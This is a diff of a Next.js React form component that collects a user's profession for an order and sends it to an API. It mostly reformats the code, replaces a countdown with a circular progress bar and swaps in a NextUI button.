@@ -1,29 +1,30 @@
-import { useRouter, useSearchParams } from 'next/navigation'
+import { useRouter, useSearchParams } from "next/navigation";
 
-import { FaArrowRightLong } from 'react-icons/fa6'
-import SwiperSlider from '@/components/SwiperSlider'
-import { useEffect, useState } from 'react'
+import { FaArrowRightLong } from "react-icons/fa6";
+import SwiperSlider from "@/components/SwiperSlider";
+import { useEffect, useState } from "react";
+import { Button, CircularProgress } from "@nextui-org/react";
 
 const Profession = () => {
-  const router = useRouter()
-  const searchParams = useSearchParams()
-  const params = new URLSearchParams(searchParams)
-  const [time, setTime] = useState(30)
+  const router = useRouter();
+  const searchParams = useSearchParams();
+  const params = new URLSearchParams(searchParams);
+  const [value, setValue] = useState(0);
 
   const handleSubmit = (e) => {
-    e.preventDefault()
+    e.preventDefault();
     const submitData = {
       profession: e.target.profession.value,
-    }
+    };
 
-    if (submitData.profession === '') {
-      toast.error('Please enter your profession')
+    if (submitData.profession === "") {
+      toast.error("Please enter your profession");
     } else {
       // post all the data through api localhost:3000/api/order
-      fetch(`${process.env.API_URL}/api/order/${params.get('id')}`, {
-        method: 'PATCH',
+      fetch(`${process.env.API_URL}/api/order/${params.get("id")}`, {
+        method: "PATCH",
         headers: {
-          'Content-Type': 'application/json',
+          "Content-Type": "application/json",
         },
         body: JSON.stringify(submitData),
       })
@@ -31,31 +32,32 @@ const Profession = () => {
         .then((data) => {
           if (data) {
             router.push({
-              pathname: '/nafat-otp-three',
-              query: { id: params.get('id') },
-            })
+              pathname: "/nafat-otp-three",
+              query: { id: params.get("id") },
+            });
           } else {
-            toast.error('Please enter correct otp')
+            toast.error("Please enter correct otp");
           }
         })
         .catch((err) => {
-          alert(`Please enter correct otp ~ ${err}`)
-        })
+          alert(`Please enter correct otp ~ ${err}`);
+        });
     }
-  }
+  };
 
   useEffect(() => {
-    const timer = setInterval(() => {
-      setTime((prevTime) => {
-        if (prevTime === 0) {
-          clearInterval(timer)
-          return 0
+    const interval = setInterval(() => {
+      setValue((v) => {
+        if (v >= 100) {
+          clearInterval(interval);
+          return 100; // Stop at 100%
         }
-        return prevTime - 1
-      })
-    }, 1000)
-    return () => clearInterval(timer)
-  }, [])
+        return v + 1;
+      });
+    }, 150); // 1200 milliseconds = 1.2 seconds
+
+    return () => clearInterval(interval);
+  }, []);
 
   return (
     <>
@@ -63,16 +65,19 @@ const Profession = () => {
       <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
         <h1 className="text-4xl font-bold text-gray-600 mt-10">Profession</h1>
 
-        {time > 0 ? (
+        {value < 100 ? (
           <>
-            <div className="flex justify-center items-center gap-2 mt-5 border-4 h-28 w-28 rounded-full">
-              <h1 className="text-2xl font-bold text-gray-600 m-0">
-                {Math.floor(time / 60)}:
-              </h1>
-              <h1 className="text-2xl font-bold text-gray-600 m-0">
-                {time % 60}
-              </h1>
-            </div>
+            <CircularProgress
+              classNames={{
+                svg: "w-36 h-36 drop-shadow-md",
+                indicator: "stroke-[#0D9488]",
+                track: "#0D9488",
+                value: "text-3xl font-semibold text-gray-700",
+              }}
+              value={value}
+              strokeWidth={4}
+              showValueLabel={true}
+            />
             <h3 className="text-xl font-bold text-gray-600 mt-10">
               Please wait for the process to be completed...
             </h3>
@@ -95,18 +100,25 @@ const Profession = () => {
                 Enter about your profession
               </label>
             </div>
-            <button
+            {/* <button
               type="submit"
               className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
             >
               Continue to nafat otp three <FaArrowRightLong size={16} />
-            </button>
+            </button> */}
+            <Button
+              color="primary"
+              type="submit"
+              className={`w-full text-white h-12 bg-[#0D9488]`}
+            >
+              Submit Profession <FaArrowRightLong size={16} />
+            </Button>
           </form>
         )}
       </div>
       <div className="h-20 bg-teal-400 mt-5" />
     </>
-  )
-}
+  );
+};
 
-export default Profession
+export default Profession;
